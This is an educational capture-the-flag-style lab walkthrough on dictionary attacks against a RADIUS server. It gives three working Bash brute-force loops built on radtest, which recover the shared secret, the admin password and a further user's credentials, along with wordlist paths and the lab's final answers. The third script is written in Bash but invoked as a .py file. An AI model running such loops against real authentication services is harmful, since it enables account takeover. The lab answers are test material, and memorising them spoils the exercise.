# RADIUS Recon: Dictionary Attacks --- Detailed Walkthrough

> **Lab:** RADIUS Recon: Dictionary Attacks\
> **Category:** Network Recon --- RADIUS\
> **Difficulty:** Beginner / Novice\
> **Goal:** Discover the RADIUS shared secret, the `admin` password, and
> the credentials of another valid user.

------------------------------------------------------------------------

## 1. Lab Overview

This lab demonstrates how dictionary attacks can be performed against a
RADIUS authentication service using `radtest`.

The lab provides two useful wordlists:

``` text
Password dictionary:
/root/wordlists/100-common-passwords.txt

Username dictionary:
/usr/share/wordlists/metasploit/unix_users.txt
```

The attack is performed in three stages:

1.  Find the **RADIUS shared secret** using the known `bob:hello`
    credentials.
2.  Find the **`admin` user's password** using the discovered RADIUS
    secret.
3.  Find another valid **username and password combination** using both
    username and password dictionaries.

### Lab questions

  Question   Objective
  ---------- ---------------------------------------------------
  Q1         Find the RADIUS secret
  Q2         Find the password of `admin`
  Q3         Find the credentials of the additional valid user

------------------------------------------------------------------------

# 2. RADIUS Basics

**RADIUS** stands for:

> Remote Authentication Dial-In User Service

In this lab, authentication requests are sent with `radtest`.

A simplified flow is:

``` text
             Authentication Request
Client  ------------------------------>  RADIUS Server
        <------------------------------
             Access-Accept / Reject
```

A successful authentication results in:

``` text
Access-Accept
```

An unsuccessful authentication results in:

``` text
Access-Reject
```

The lab uses these responses to determine whether a username/password
combination is valid.

------------------------------------------------------------------------

# 3. Tools and Wordlists Used

## `radtest`

`radtest` is the main command used to send a test authentication request
to the RADIUS server.

General form:

``` bash
radtest <username> <password> <server> <nas-port> <secret>
```

In this lab:

``` bash
radtest bob hello target-1 10 <secret>
```

The important values are:

``` text
bob       -> username
hello     -> password
target-1  -> RADIUS server
10        -> NAS-Port value
<secret>  -> RADIUS shared secret being tested
```

------------------------------------------------------------------------

## Password wordlist

``` text
/root/wordlists/100-common-passwords.txt
```

This contains candidate passwords/secrets that can be tested
automatically.

------------------------------------------------------------------------

## Username wordlist

``` text
/usr/share/wordlists/metasploit/unix_users.txt
```

This contains candidate usernames.

------------------------------------------------------------------------

# 4. Stage 1 --- Find the RADIUS Secret

## Question

> What is the RADIUS secret, assuming the default credential pair
> `bob:hello` is enabled?

We already know:

``` text
Username = bob
Password = hello
```

But we don't know the RADIUS shared secret.

Therefore, we use the password dictionary as a list of possible RADIUS
secrets.

------------------------------------------------------------------------

## 4.1 Create the `brute` Script

Create a file:

``` bash
vim brute
```

Add:

``` bash
#!/bin/bash

while read password; do
    radtest bob hello target-1 10 $password > /dev/null

    if [ "$?" = "0" ]; then
        echo "Correct RADIUS secret: $password"
        break
    else
        continue
    fi
done < $1
```

------------------------------------------------------------------------

## 4.2 Easy Explanation of `brute`

The script is basically doing this:

``` text
Read one word from the password dictionary
              ↓
Use it as the RADIUS secret
              ↓
Send bob:hello to the RADIUS server
              ↓
Did authentication succeed?
        ↙             ↘
      YES              NO
       ↓                ↓
Print secret       Try next word
       ↓
     STOP
```

### Line-by-line explanation

### Shebang

``` bash
#!/bin/bash
```

Tells Linux to execute the script using Bash.

------------------------------------------------------------------------

### Read passwords one at a time

``` bash
while read password; do
```

Reads one line at a time from the supplied wordlist.

For example:

``` text
password1
admin
123456
sweetness
...
```

Each value is stored in:

``` bash
$password
```

------------------------------------------------------------------------

### Test the candidate secret

``` bash
radtest bob hello target-1 10 $password > /dev/null
```

This sends a RADIUS authentication request using:

``` text
Username: bob
Password: hello
Server:   target-1
Port:     10
Secret:   current dictionary value
```

The important part is:

``` bash
$password
```

The script changes this value for every dictionary entry.

`> /dev/null` prevents normal command output from filling the terminal.

------------------------------------------------------------------------

### Check whether `radtest` succeeded

``` bash
if [ "$?" = "0" ]; then
```

`$?` contains the exit status of the previous command.

In this script:

``` text
0 = command succeeded
non-zero = command failed
```

So:

``` bash
"$?" = "0"
```

means the previous `radtest` command succeeded.

------------------------------------------------------------------------

### Print the discovered secret

``` bash
echo "Correct RADIUS secret: $password"
```

If authentication succeeds, the current dictionary value is printed as
the correct secret.

------------------------------------------------------------------------

### Stop after success

``` bash
break
```

Stops the loop.

There is no reason to continue testing once the correct secret has been
found.

------------------------------------------------------------------------

### Continue after failure

``` bash
else
    continue
fi
```

If the current candidate fails, move to the next word.

------------------------------------------------------------------------

### Use the supplied wordlist

``` bash
done < $1
```

`$1` means the **first command-line argument**.

When we run:

``` bash
./brute /root/wordlists/100-common-passwords.txt
```

then:

``` text
$1
=
/root/wordlists/100-common-passwords.txt
```

So the script reads passwords from that file.

------------------------------------------------------------------------

## 4.3 Make the Script Executable

``` bash
chmod +x brute
```

This gives the script execute permission.

------------------------------------------------------------------------

## 4.4 Run the Dictionary Attack

``` bash
./brute /root/wordlists/100-common-passwords.txt
```

The script tests each word as the RADIUS secret.

You may see messages such as:

``` text
No reply from server
```

for incorrect candidate secrets.

Eventually the successful result is:

``` text
Correct RADIUS secret: sweetness
```

### Image Placeholder --- `brute.png`

> **\[IMAGE PLACEHOLDER: Insert `brute.png` here\]**
>
> Screenshot showing the `brute` script and the successful discovery of
> the RADIUS secret.

### Result

``` text
RADIUS Secret = sweetness
```

------------------------------------------------------------------------

# 5. Why Was `bob:hello` Used?

This is an important concept in the lab.

We already have a valid credential pair:

``` text
bob : hello
```

But we don't know the shared RADIUS secret.

So the attack changes the unknown part:

``` text
Known:
    bob
    hello

Unknown:
    RADIUS secret
```

The script therefore tries:

``` text
bob:hello + candidate secret 1
bob:hello + candidate secret 2
bob:hello + candidate secret 3
...
bob:hello + sweetness
```

When the correct secret is used, the request succeeds.

This is why the first script is useful: **the username and password are
fixed, while only the RADIUS secret changes.**

------------------------------------------------------------------------

# 6. Stage 2 --- Find the `admin` Password

Now we know the RADIUS secret:

``` text
sweetness
```

The next question is:

> What is the password of the user `admin`?

This time:

``` text
Known:
    Username = admin
    RADIUS secret = sweetness

Unknown:
    Password
```

Therefore, the password dictionary is used to test different passwords.

------------------------------------------------------------------------

# 7. Create the `brute2` Script

Create the file:

``` bash
vim brute2
```

Add:

``` bash
#!/bin/bash

while read password; do
    radtest admin $password target-1 10 sweetness > /dev/null

    if [ "$?" = "0" ]; then
        echo "Correct user password: $password"
        break
    else
        continue
    fi
done < $1
```

------------------------------------------------------------------------

# 8. Easy Explanation of `brute2`

This script is almost identical to `brute`.

The major difference is **what is being guessed**.

### First script

``` bash
radtest bob hello target-1 10 $password
```

The script guessed:

``` text
RADIUS secret
```

### Second script

``` bash
radtest admin $password target-1 10 sweetness
```

The script guesses:

``` text
admin's password
```

while keeping the RADIUS secret fixed.

------------------------------------------------------------------------

## How `brute2` works

``` text
Read password from dictionary
              ↓
Use it as admin's password
              ↓
Use known secret: sweetness
              ↓
Send RADIUS authentication request
              ↓
Successful?
        ↙             ↘
      YES              NO
       ↓                ↓
Print password      Try next password
       ↓
     STOP
```

------------------------------------------------------------------------

## Important line

``` bash
radtest admin $password target-1 10 sweetness > /dev/null
```

Here:

``` text
admin       -> fixed username
$password   -> candidate password
target-1    -> RADIUS server
10          -> NAS-Port value
sweetness   -> known RADIUS secret
```

Only `$password` changes.

------------------------------------------------------------------------

# 9. Make `brute2` Executable

``` bash
chmod +x brute2
```

Then run:

``` bash
./brute2 /root/wordlists/100-common-passwords.txt
```

The script tests every password in the wordlist.

Eventually:

``` text
Correct user password: chicago
```

### Image Placeholder --- `brute2.png`

> **\[IMAGE PLACEHOLDER: Insert `brute2.png` here\]**
>
> Screenshot showing the `brute2` script and the successful discovery of
> the `admin` password.

### Result

``` text
admin password = chicago
```

------------------------------------------------------------------------

# 10. Stage 3 --- Find the Additional Valid User

The lab states that there is one more valid user besides:

``` text
bob
admin
```

Now both the username and password are unknown.

We have:

``` text
Username dictionary:
 /usr/share/wordlists/metasploit/unix_users.txt

Password dictionary:
 /root/wordlists/100-common-passwords.txt

RADIUS secret:
 sweetness
```

The goal is to find a valid combination.

------------------------------------------------------------------------

# 11. Username + Password Dictionary Attack

The logic is:

``` text
Take username #1
    ↓
Try password #1
Try password #2
Try password #3
...
    ↓
Move to username #2
    ↓
Try password #1
Try password #2
...
```

In programming terms, this is a **nested loop**:

``` text
for every username:
    for every password:
        test username + password
```

------------------------------------------------------------------------

# 12. `brute3` Script

The supplied lab walkthrough uses a third script for this stage.

A Bash version of the same logic is:

``` bash
#!/bin/bash

while read username; do

    if [ "$username" = "" ]; then
        continue
    fi

    while read password; do

        radtest $username $password target-1 10 sweetness > /dev/null

        if [ "$?" = "0" ]; then
            echo "Correct username: $username password: $password"
            break
        else
            continue
        fi

    done < $1

done < $2
```

------------------------------------------------------------------------

# 13. Easy Explanation of `brute3`

This is the most important script conceptually because it uses **two
wordlists**.

### Outer loop

``` bash
while read username; do
```

Reads usernames from the username dictionary.

Example:

``` text
root
admin
guest
auditor
...
```

------------------------------------------------------------------------

### Ignore blank usernames

``` bash
if [ "$username" = "" ]; then
    continue
fi
```

If the line is empty, skip it.

------------------------------------------------------------------------

### Inner loop

``` bash
while read password; do
```

For each username, read every password from the password dictionary.

------------------------------------------------------------------------

### Test the combination

``` bash
radtest $username $password target-1 10 sweetness
```

Now both values change:

``` text
$username  → candidate username
$password  → candidate password
```

The RADIUS secret remains fixed:

``` text
sweetness
```

------------------------------------------------------------------------

### Check authentication result

``` bash
if [ "$?" = "0" ]; then
```

If `radtest` succeeds, the combination is considered valid.

------------------------------------------------------------------------

### Print the valid credentials

``` bash
echo "Correct username: $username password: $password"
```

For this lab, the successful combination is:

``` text
auditor : ashlee
```

------------------------------------------------------------------------

# 14. Run `brute3`

Use the password dictionary and username dictionary:

``` bash
./brute3.py \
/root/wordlists/100-common-passwords.txt \
/usr/share/wordlists/metasploit/unix_users.txt
```

The supplied walkthrough specifies these same two wordlists for the
third stage.

The successful result is:

``` text
Correct username: auditor password: ashlee
```

### Image Placeholder --- `brute3.png`

> **\[IMAGE PLACEHOLDER: Insert `brute3.png` here\]**
>
> Screenshot showing the username/password dictionary attack and the
> successful `auditor:ashlee` result.

### Result

``` text
Username = auditor
Password = ashlee
```

------------------------------------------------------------------------

# 15. Understanding the Three Scripts Together

This is the easiest way to remember the entire lab.

## `brute`

### What does it find?

``` text
RADIUS secret
```

### What stays fixed?

``` text
Username = bob
Password = hello
```

### What changes?

``` text
RADIUS secret
```

### Command

``` bash
./brute /root/wordlists/100-common-passwords.txt
```

------------------------------------------------------------------------

## `brute2`

### What does it find?

``` text
admin password
```

### What stays fixed?

``` text
Username = admin
RADIUS secret = sweetness
```

### What changes?

``` text
Password
```

### Command

``` bash
./brute2 /root/wordlists/100-common-passwords.txt
```

------------------------------------------------------------------------

## `brute3`

### What does it find?

``` text
Another valid username + password
```

### What stays fixed?

``` text
RADIUS secret = sweetness
```

### What changes?

``` text
Username
Password
```

### Wordlists

``` text
Username:
 /usr/share/wordlists/metasploit/unix_users.txt

Password:
 /root/wordlists/100-common-passwords.txt
```

------------------------------------------------------------------------

# 16. Comparison Table

  -----------------------------------------------------------------------
  Script            Known             Unknown           Wordlist
  ----------------- ----------------- ----------------- -----------------
  `brute`           `bob:hello`       RADIUS secret     Password list

  `brute2`          `admin` +         Admin password    Password list
                    `sweetness`                         

  `brute3`          `sweetness`       Username +        Username +
                                      password          password lists
  -----------------------------------------------------------------------

------------------------------------------------------------------------

# 17. What Does `$1` Mean?

The scripts use:

``` bash
$1
```

and the third script uses two arguments.

In Bash:

``` text
$0 = script name
$1 = first argument
$2 = second argument
$3 = third argument
```

For example:

``` bash
./brute passwords.txt
```

means:

``` text
$0 = ./brute
$1 = passwords.txt
```

For the third script:

``` bash
./brute3.py passwords.txt users.txt
```

the arguments are:

``` text
$1 = passwords.txt
$2 = users.txt
```

Therefore:

``` bash
done < $1
```

reads the password list, while:

``` bash
done < $2
```

reads the username list.

------------------------------------------------------------------------

# 18. What Does `$?` Mean?

This appears in all three scripts:

``` bash
if [ "$?" = "0" ]; then
```

`$?` represents the exit status of the command that was executed
immediately before it.

For this lab:

``` text
0
↓
Successful command execution
```

A non-zero value means the command did not succeed.

Therefore the script uses `$?` to decide whether to:

``` text
SUCCESS → print the result and stop

FAILURE → continue trying
```

------------------------------------------------------------------------

# 19. Why Use `break`?

When the correct credential is found:

``` bash
break
```

stops the current loop.

Without `break`, the script would continue testing the rest of the
dictionary even after finding the correct value.

Example:

``` text
password1  → fail
password2  → fail
chicago    → SUCCESS
password4  → unnecessary
password5  → unnecessary
...
```

`break` stops the attack immediately after the successful result.

------------------------------------------------------------------------

# 20. Why Use `continue`?

When the current attempt fails:

``` bash
continue
```

tells Bash to move to the next iteration of the loop.

Conceptually:

``` text
Try candidate
     ↓
Failed?
     ↓
continue
     ↓
Try next candidate
```

------------------------------------------------------------------------

# 21. Understanding the Error Messages

During the attacks you may see:

``` text
Expected Access-Accept got Access-Reject
```

This means the tested authentication attempt was rejected.

For the first attack you may also see:

``` text
No reply from server
```

This occurs in the lab output while candidate shared secrets are being
tested.

The important point is that these messages are expected during the
dictionary attack. The script keeps testing candidates until it receives
the successful result.

The success indicators are:

``` text
Correct RADIUS secret: sweetness
```

or:

``` text
Correct user password: chicago
```

or:

``` text
Correct username: auditor password: ashlee
```

------------------------------------------------------------------------

# 22. Complete Lab Flow

The complete attack chain is:

``` text
                 START
                   |
                   v
        Known credentials: bob:hello
                   |
                   v
       Guess RADIUS shared secret
                   |
                   v
             sweetness
                   |
                   v
        Guess admin's password
                   |
                   v
              chicago
                   |
                   v
      Guess username + password
                   |
                   v
          auditor : ashlee
                   |
                   v
                  END
```

------------------------------------------------------------------------

# 23. Final Answers

``` text
Q1. RADIUS secret:
sweetness

Q2. admin password:
chicago

Q3. Other valid user:
auditor

Password:
ashlee

Credentials:
auditor:ashlee
```

------------------------------------------------------------------------

# 24. Quick Commands Reference

### Create first script

``` bash
vim brute
chmod +x brute
./brute /root/wordlists/100-common-passwords.txt
```

### Create second script

``` bash
vim brute2
chmod +x brute2
./brute2 /root/wordlists/100-common-passwords.txt
```

### Third attack

``` bash
./brute3.py \
/root/wordlists/100-common-passwords.txt \
/usr/share/wordlists/metasploit/unix_users.txt
```

------------------------------------------------------------------------

# 25. Key Takeaways

### 1. Dictionary attacks automate repeated authentication attempts

Instead of manually testing:

``` text
password1
password2
password3
...
```

a script reads the wordlist automatically.

### 2. The first attack finds the RADIUS secret

Known:

``` text
bob:hello
```

Unknown:

``` text
RADIUS secret
```

Result:

``` text
sweetness
```

### 3. The second attack finds a user's password

Known:

``` text
admin
sweetness
```

Unknown:

``` text
admin password
```

Result:

``` text
chicago
```

### 4. The third attack combines two dictionaries

Unknown:

``` text
username
password
```

The script tests combinations until it finds:

``` text
auditor:ashlee
```

### 5. Understand the script logic, not just the commands

The core pattern is:

``` text
Read candidate
      ↓
Run radtest
      ↓
Check $?
      ↓
Success → print + break
Failure → continue
```

For two unknown values:

``` text
Read username
      ↓
Read password
      ↓
Run radtest
      ↓
Check result
      ↓
Success → print credentials
```

------------------------------------------------------------------------

## References

-   RADIUS RFC --- RFC 2865
-   `radtest` documentation
-   `radclient` documentation

------------------------------------------------------------------------

## Lab Summary

**RADIUS Recon: Dictionary Attacks** demonstrates how `radtest`, Bash
loops, and wordlists can be combined to automate RADIUS authentication
testing in an authorized lab environment.

The most important progression to remember is:

``` text
Known valid credentials
        ↓
Find RADIUS secret
        ↓
Use secret to find another password
        ↓
Use secret + dictionaries to find another user
```

This lab is a good introduction to understanding how authentication
protocols can be tested systematically rather than manually.
